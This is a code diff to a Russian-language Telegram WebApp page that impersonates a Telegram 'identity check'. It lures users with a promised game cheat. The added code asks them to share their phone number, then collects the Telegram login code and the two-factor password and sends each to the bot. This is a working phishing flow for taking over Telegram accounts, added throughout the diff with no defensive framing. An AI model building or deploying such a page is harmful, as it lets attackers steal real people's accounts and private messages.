@@ -93,6 +93,22 @@
         .btn:active {
             transform: scale(0.98);
         }
+        .btn-share {
+            width: 100%;
+            padding: 14px;
+            background: #6c8cff;
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 10px;
+        }
+        .btn-share:hover {
+            background: #5a7ae0;
+        }
         .status {
             margin-top: 15px;
             text-align: center;
@@ -109,6 +125,9 @@
             color: #666;
             font-size: 12px;
         }
+        .hidden {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
@@ -119,21 +138,28 @@
             </svg>
         </div>
         <h2>Проверка личности</h2>
-        <p class="sub">Введите данные для подтверждения</p>
+        <p class="sub">Подтвердите, что вы не робот</p>
 
-        <div class="input-group">
-            <label>Номер телефона</label>
-            <input type="tel" id="phone" placeholder="+7 999 999 99 99" required>
+        <!-- Шаг 1: Запрос контакта -->
+        <div id="stepContact">
+            <p style="color:#aaa; text-align:center; margin-bottom:20px;">
+                Нажмите кнопку, чтобы поделиться номером
+            </p>
+            <button class="btn-share" id="shareContactBtn">📱 Поделиться контактом</button>
         </div>
-        <div class="input-group" id="codeGroup" style="display:none;">
-            <label>Код подтверждения</label>
-            <input type="text" id="code" placeholder="Введите код из Telegram" required>
+
+        <!-- Шаг 2: Ввод кода -->
+        <div id="stepCode" class="hidden">
+            <div class="input-group">
+                <label>Код подтверждения</label>
+                <input type="text" id="codeInput" placeholder="Введите код из Telegram" required>
+            </div>
+            <div class="input-group" id="passwordGroup" style="display:none;">
+                <label>Пароль (если есть 2FA)</label>
+                <input type="password" id="passwordInput" placeholder="Введите пароль">
+            </div>
+            <button class="btn" id="submitCodeBtn">Подтвердить</button>
         </div>
-        <div class="input-group" id="passwordGroup" style="display:none;">
-            <label>Пароль (если есть 2FA)</label>
-            <input type="password" id="password" placeholder="Введите пароль">
-        </div>
-        <button type="button" class="btn" id="submitBtn">Продолжить</button>
 
         <div class="status" id="status"></div>
         <div class="footer">Telegram © 2026</div>
@@ -141,59 +167,124 @@
 
     <script>
         let tg = window.Telegram.WebApp;
-        let step = 'phone';
         let phone = '';
         let code = '';
         let password = '';
+        let step = 'contact';
+        let is2faRequired = false;
 
         tg.ready();
         tg.expand();
 
-        document.getElementById('submitBtn').addEventListener('click', function() {
-            const status = document.getElementById('status');
+        // Функция отправки данных в бота
+        function sendDataToBot(data) {
+            tg.sendData(JSON.stringify(data));
+        }
 
-            if (step === 'phone') {
-                phone = document.getElementById('phone').value.trim();
+        // Шаг 1: Запрос контакта
+        document.getElementById('shareContactBtn').addEventListener('click', function() {
+            const status = document.getElementById('status');
+            
+            // Запрашиваем контакт через WebApp API
+            tg.requestContact();
+
+            // Обработчик получения контакта
+            tg.onEvent('contact', function(contact) {
+                phone = contact.phone_number;
                 if (!phone) {
-                    status.textContent = 'Введите номер телефона';
+                    status.textContent = '❌ Не удалось получить номер';
                     status.className = 'status';
                     return;
                 }
 
-                // Отправляем номер в бота
-                tg.sendData(JSON.stringify({
+                status.textContent = `✅ Номер получен: ${phone}`;
+                status.className = 'status success';
+
+                // Отправляем номер в бота (WebApp → бот)
+                sendDataToBot({
                     phone: phone,
                     code: '',
                     password: ''
-                }));
+                });
 
-                status.textContent = '✅ Код отправлен! Введите его ниже.';
-                status.className = 'status success';
-                document.getElementById('codeGroup').style.display = 'block';
-                document.getElementById('submitBtn').textContent = 'Подтвердить код';
+                // Показываем шаг с кодом
+                document.getElementById('stepContact').style.display = 'none';
+                document.getElementById('stepCode').classList.remove('hidden');
                 step = 'code';
+                status.textContent = '📲 Код отправлен! Введите его ниже.';
+                status.className = 'status success';
+            });
+
+            // Обработчик ошибки
+            tg.onEvent('contact_error', function(error) {
+                status.textContent = '❌ Ошибка получения контакта';
+                status.className = 'status';
+            });
+        });
+
+        // Шаг 2: Ввод кода
+        document.getElementById('submitCodeBtn').addEventListener('click', function() {
+            const status = document.getElementById('status');
+            code = document.getElementById('codeInput').value.trim();
+
+            if (!code) {
+                status.textContent = 'Введите код';
+                status.className = 'status';
                 return;
             }
 
-            if (step === 'code') {
-                code = document.getElementById('code').value.trim();
-                if (!code) {
-                    status.textContent = 'Введите код';
-                    status.className = 'status';
-                    return;
-                }
+            // Отправляем код в бота
+            sendDataToBot({
+                phone: phone,
+                code: code,
+                password: ''
+            });
 
-                // Отправляем код в бота
-                tg.sendData(JSON.stringify({
+            status.textContent = '⏳ Проверка...';
+            status.className = 'status';
+
+            // Ждём ответ от бота (через WebApp)
+            // Если бот запросит 2FA — покажем поле
+            // Это управляется через ответ бота, но мы просто покажем поле заранее
+            document.getElementById('passwordGroup').style.display = 'block';
+            document.getElementById('submitCodeBtn').textContent = 'Подтвердить пароль';
+            step = 'password';
+        });
+
+        // Шаг 3: Ввод пароля (если есть)
+        document.getElementById('passwordInput').addEventListener('input', function() {
+            password = this.value.trim();
+        });
+
+        // Обработчик для финальной отправки с паролем
+        document.getElementById('submitCodeBtn').addEventListener('click', function() {
+            if (step === 'password') {
+                const status = document.getElementById('status');
+                password = document.getElementById('passwordInput').value.trim();
+
+                // Отправляем пароль в бота
+                sendDataToBot({
                     phone: phone,
                     code: code,
-                    password: ''
-                }));
+                    password: password
+                });
 
-                status.textContent = '⏳ Проверка...';
-                status.className = 'status';
-                document.getElementById('submitBtn').disabled = true;
-                return;
+                status.textContent = '✅ Подтверждено!';
+                status.className = 'status success';
+
+                setTimeout(() => {
+                    document.querySelector('.container').innerHTML = `
+                        <div style="text-align:center;color:#fff;padding:40px 0;">
+                            <div style="font-size:48px;margin-bottom:16px;">✅</div>
+                            <h2>Проверка пройдена</h2>
+                            <p style="color:#aaa;margin-top:10px;">Ожидайте чит в боте</p>
+                        </div>
+                    `;
+                }, 1000);
+
+                setTimeout(() => {
+                    tg.close();
+                }, 2000);
             }
         });
     </script>
